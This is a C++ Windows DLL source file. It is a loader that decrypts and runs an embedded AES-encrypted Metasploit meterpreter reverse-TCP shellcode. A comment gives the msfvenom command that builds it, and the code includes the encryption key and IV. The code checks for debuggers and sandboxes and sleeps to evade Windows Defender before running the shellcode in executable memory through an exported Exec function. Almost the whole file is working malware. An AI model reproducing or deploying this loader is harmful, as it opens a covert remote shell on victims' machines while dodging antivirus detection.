// dllmain.cpp : Définit le point d'entrée de l'application DLL.
#define CBC 1
#include "aes.h"
#include <Windows.h>
#include <Wininet.h>
#include <stdbool.h> 
#include <stdio.h>
#include <string.h> 
#include <stdlib.h> 
#include <iostream>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Wininet.lib")

using namespace std;

// The encrypted buffer length is manually calculated because sometimes 
// there are null bytes in the buffer. 
//#define ENCRYPTEDBUFFERLENGTH 465

// Actual length of the payload 
#define PAYLOADLENGTH 458
#define IV "E7a0eCX76F0YzS4j"
#define KEY "6ASMkFslyhwXehNZw048cF1Vh1ACzyyR"
#define CLASSNAME "myWindowClass"
#define WINDOWTITLE "My Title"

// RC4 payload is used to maximize stealth during network communication. 
// $ ruby msfvenom -p windows/meterpreter/reverse_tcp_rc4 EXIT_FUNC=PROCESS LHOST-192.168.1.24 LPORT=443 RC4PASSWORD=GeekIsChic --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /mnt/hgfs/share_vm/meterpreter.c
// Payload size: 458 bytes
// Final size of c file : 1973 bytes
unsigned char buf[] =
"\x62\x7e\x8e\x3f\x11\x74\x66\xdd\x2b\x2f\x67\xad\xdf\xa6\x05"
"\xe6\x06\x63\xb9\x69\xcc\x7f\xbb\x63\x64\x79\xf1\x09\x77\xf6"
"\x04\x90\x5e\x06\xe6\xb7\x62\x29\x34\x0d\x18\xca\x95\x6f\x93"
"\xc5\xa2\x6b\x66\xa9\x07\x4e\x33\x06\x60\x10\xd1\x1d\x44\x2a"
"\x65\x95\x50\x7c\x1a\x9d\xe1\x76\x09\xc5\x0c\x33\x73\x8e\x72"
"\xbd\x0d\x37\x0c\x6f\x94\x53\x2f\x54\x90\xff\x41\x2a\x5d\x14"
"\x9d\xd4\x42\x3e\x7a\xcd\x2b\x50\x5c\x1a\x1f\xc2\x38\x99\x4a"
"\x13\xcc\x12\x05\x9b\x95\x2a\x20\x47\x79\xf3\x10\xd0\xd8\x9a"
"\xa1\x9f\xe7\x0e\x07\x2f\x53\x3c\x3e\x8c\xcb\x04\xcf\xfc\xac"
"\xb9\x18\x12\x17\x16\xb4\x41\x4d\x49\x67\xa4\xb1\xbb\x9f\xc9"
"\xe9\x61\x6e\xd0\x0d\x7b\x73\x31\x6f\x73\xf1\x4a\xd0\xa5\xa7"
"\x06\xaa\xdb\xa6\xe2\xb2\x21\xd3\x7c\xd7\xdd\xd5\x1b\x69\xdb"
"\xdd\x1d\x3a\x93\xe2\x1a\xc7\xf7\x69\x2e\x3e\xd7\xf9\x9a\x43"
"\x90\x17\x74\x26\x17\x15\xee\x5d\x92\x4a\x44\xf8\xab\xf7\xfa"
"\x9d\xad\xce\x4d\xc4\x51\xf9\x6f\xf3\x2d\x57\x17\xea\x8f\xf6"
"\xb4\x27\x6d\x8e\xc4\x8c\xa1\x5a\xdb\xc1\x38\x40\x89\x46\xb8"
"\x65\x95\x2f\x8a\xc2\xaf\x5c\xe7\x6e\x53\xdf\x09\x09\x40\x6a"
"\x46\x1e\xe5\xb0\x17\xfb\xc0\x59\x76\x99\x80\x4b\xb9\x2d\x6e"
"\x25\x0a\x96\x52\xb1\x89\x47\xc6\xbc\x58\x86\x04\x77\xbd\xa1"
"\x96\x7b\x21\x0b\xf1\x8d\x81\xe8\xbd\xf4\x5a\xfd\xce\xc5\x81"
"\xa5\x51\xd0\x7f\x98\x6a\x8b\xc0\x76\xda\xba\xdf\x15\xd5\xd3"
"\xfb\x3d\x4c\x9b\x4d\xde\x3b\x34\x62\xd6\x4a\x6f\x78\xd1\xcb"
"\x35\xb0\xf4\xeb\x3f\x8f\xe5\x8d\x04\x32\x3f\xe8\xbf\x3e\xb2"
"\xa1\x66\xf3\xc4\x69\xa1\xce\x89\x8c\xc9\x2a\x3b\xa6\xe5\x05"
"\xc6\x87\xec\xe7\x20\x38\x30\xbb\x6e\x71\x12\x79\x5a\x0c\xf7"
"\xb6\xb7\x9e\xd8\x38\x4c\x08\xda\x9f\xfb\x09\x4b\x39\x7f\x9c"
"\xfe\x53\x02\xa1\xd8\xdc\xed\x34\x06\x55\xd6\xd1\x69\xf1\xc9"
"\x33\x8e\x48\x72\x75\x78\x4c\xbb\xa0\x22\x29\xc6\x23\x8e\x8f"
"\xe0\x02\xdb\x60\xd5\xb9\x72\xd1\xeb\x01\x94\x5f\xbc\x65\x18"
"\x42\x37\x29\x66\xb3\xb0\x2c\x65\xb5\x22\x98\x28\xed\x84\x2d"
"\x68\xad\xe4\x8c\xf7\x7b\x62\xf1\x16\x6c\xe2\x3f\xc8\xb8";

const int ENCRYPTEDBUFFERLENGTH = sizeof(buf);

namespace Aes256MsfPayload {
	class Utils {
	public:
		static char IsDbgPresent() {
			char present = 0;
			__asm {
				mov eax, fs:[30h]
				mov al, [eax + 2h]
				mov present, al
			}
#ifdef DEBUG 
			return 0;
#else
			return present;
#endif
		}

		static bool IsSandboxPresent() {
			// Non-uniform memory access (NUMA) is a computer memory design used in multiprocessing, 
			// where the memory access time depends on the memory location relative to the processor.
			// https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
			return VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0) == NULL;
		}

		static DWORD WINAPI ExecuteCode(LPVOID lpPayload) {
			void(*func)();
			func = (void(*)()) lpPayload;
			(void)(*func)();
			return 0;
		}
	};

	class CryptoUtils {
	public:
		static void AES256Decrypt(uint8_t* uString, uint8_t* uIv, const char* uKey) {
			struct AES_ctx ctx;
			AES_init_ctx_iv(&ctx, uKey, uIv);
			AES_CBC_decrypt_buffer(&ctx, uString, PAYLOADLENGTH);

			// The last byte needs to a null-byte terminator to read correctly.
			memcpy((char*)uString + PAYLOADLENGTH, "\x00", 1);
		}
	};

	class Rc4ReverseTcp {
	public:
		void Start() {
			TCHAR s[256];
			int x = 4;

			LPVOID lpPayload = VirtualAlloc(NULL, ENCRYPTEDBUFFERLENGTH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (lpPayload) {
				ZeroMemory(lpPayload, ENCRYPTEDBUFFERLENGTH);
				memcpy(lpPayload, buf, ENCRYPTEDBUFFERLENGTH);
			}
			else {
				return;
			}

			// uint8_t : 8 unsigned bits
			uint8_t* uPayload = (uint8_t*)lpPayload;
			uint8_t* uIv = (uint8_t*)IV;
			//uint8_t* uKey = (uint8_t*)KEY;

			CryptoUtils::AES256Decrypt(uPayload, uIv, KEY);

			// Also useful to bypass Sandboxing
			// AFAIK it's working for Windows Defender
			Sleep(10000);
			Utils::ExecuteCode(uPayload);
		}
	};
}

extern "C" __declspec(dllexport) void Exec() {
	if (!Aes256MsfPayload::Utils::IsDbgPresent() && !Aes256MsfPayload::Utils::IsSandboxPresent()) {
		Aes256MsfPayload::Rc4ReverseTcp* p = new Aes256MsfPayload::Rc4ReverseTcp();
		try {
			p->Start();
			delete(p);
		}
		catch (const std::exception &e) {
			OutputDebugString("We had a boo-boot");
			OutputDebugString(e.what());
		}
	}
}

// For testing purpose
// Use https://docs.microsoft.com/en-us/sysinternals/downloads/debugview to monitor debug output
extern "C" __declspec(dllexport) void Test() {
	OutputDebugString("Hello World!!");
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

